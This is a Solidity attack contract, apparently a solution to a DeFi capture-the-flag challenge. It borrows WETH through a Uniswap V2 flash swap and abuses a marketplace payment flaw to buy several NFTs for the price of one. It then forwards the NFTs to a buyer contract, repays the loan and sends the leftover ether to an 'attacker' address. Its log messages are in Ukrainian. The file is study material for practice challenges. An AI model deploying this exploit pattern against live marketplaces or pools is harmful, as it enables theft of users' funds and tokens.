pragma solidity =0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';


import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function getBalanceOf(address) external returns(uint);
}


interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IERC721{
    function safeTransferFrom(address, address, uint256) external;
}
interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}
interface IMarketplace {
    function buyMany(uint256[] calldata) external payable;
}
contract FlashSwap is IUniswapV2Callee, IERC721Receiver {
    using SafeMath for uint;

    IWETH public immutable weth;

    IUniswapV2Pair public immutable pair;
    IMarketplace public immutable marketplace;
    IERC721 public immutable nft;
    
    uint256 private amountOut;
    uint256[] private tokenIds;

    address public immutable attacker;
    address public immutable freeRiderBuyer;
    address public immutable tokenInPool;
    //address public immutable marketplace;
    constructor(address _weth, address _tokenInPool, address _pair, address _marketplace, address _freeRiderBuyer, address _nft, uint256[] memory _tokenIds ) public{
        weth = IWETH(_weth);
        nft = IERC721(_nft);

        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);

        attacker = msg.sender;
        freeRiderBuyer = _freeRiderBuyer;
        tokenIds = _tokenIds;
        tokenInPool = _tokenInPool;


    }

    function flashSwap(uint256 _amountOut) public{
        amountOut = _amountOut;
        

        (address token0,) = UniswapV2Library.sortTokens(address(weth), tokenInPool);
        

        (uint amount0Out, uint amount1Out) = tokenInPool == token0 ? (uint(0), amountOut) : (amountOut, uint(0));

        pair.swap(amount0Out, amount1Out, address(this), abi.encodePacked("2"));
    }

    function swapCalculations(uint amount0Out, uint amount1Out) public view{
        (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();
        console.log("uniswap pair reserve0: %s, reserve1: %s ", _reserve0, _reserve1);
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');

        uint balance0 = IERC20(pair.token0()).balanceOf(address(pair));
        uint balance1 = IERC20(pair.token1()).balanceOf(address(pair));
        console.log("uniswap pair balance0: %s, balance1: %s ", balance0, balance1);
        
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        console.log("uniswap pair amount0In: %s, amount1In %s ", amount0In, amount1In);

        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        console.log("uniswap pair balance0Adjusted: %s, balance1Adjusted %s: ", balance0Adjusted, balance1Adjusted);

        console.log("resulting constant: %s, previous constant: %s ",balance0Adjusted.mul(balance1Adjusted), uint(_reserve0).mul(_reserve1).mul(1000**2));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: internal K');
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) override external{
        //console.log("uniswapV2Call called, the weth balance now %s: ", weth.getBalanceOf(address(this)));
        //console.log("amount0: %s , amount1: %s", amount0, amount1);
        weth.withdraw(weth.getBalanceOf(address(this)));
        console.log("Позичаємо ефіріум: %s", address(this).balance);

        console.log("Пробуємо придбати всі nft за ціною одного: ");
        marketplace.buyMany{value: 15 ether}(tokenIds);
        //(bool success,) = marketplace.call{value: 15 ether}(abi.encodeWithSelector(bytes4(keccak256('buyMany(uint256[])')),tokenIds)); 
        //require(success, 'Failed buying tokens' );    
        console.log("Баланс: %s", address(this).balance);

        for(uint256 i = 0; i < tokenIds.length; i++){
            //(bool success,) = nft.call(abi.encodeWithSelector(bytes4(keccak256('safeTransferFrom(address, address, uint256)')),address(this), address(freeRiderBuyer), tokenIds[i])); 
            //require(success, 'Transfer of nft failed' );   
            nft.safeTransferFrom(address(this), freeRiderBuyer, tokenIds[i]); 
        }
        console.log("Надсилаємо усі nft роботодавцю, баланс тепер: %s ", attacker.balance);

        uint valueToGiveBack = amountOut.add(amountOut.mul(35) /10000);
        payable(address(weth)).call{value: valueToGiveBack}("");
        //console.log("weth deposited, the balance of flashSwap now: %s ", weth.getBalanceOf(address(this)));

        weth.transfer(address(pair), valueToGiveBack);
        console.log("Віддаємо позичені 16 ефіріумів");

        payable(attacker).call{value: address(this).balance}("");
        //console.log("balance transferred to attacker, balance now: %s: ", attacker.balance);

        //swapCalculations(amount0, amount1);
    }

   

    function onERC721Received(address, address, uint256 _tokenId, bytes calldata data) override external returns (bytes4){
        console.log("Отримано токен номер: %s", _tokenId);
        //console.logBytes4(bytes4(keccak256('onERC721Received(address, address, uint256, bytes)')));
        //console.logBytes4(IERC721Receiver.onERC721Received.selector);
        return IERC721Receiver.onERC721Received.selector; 
    }

    receive() external payable {
        console.log("Отримано ефіріум: %s", msg.value);
    }
}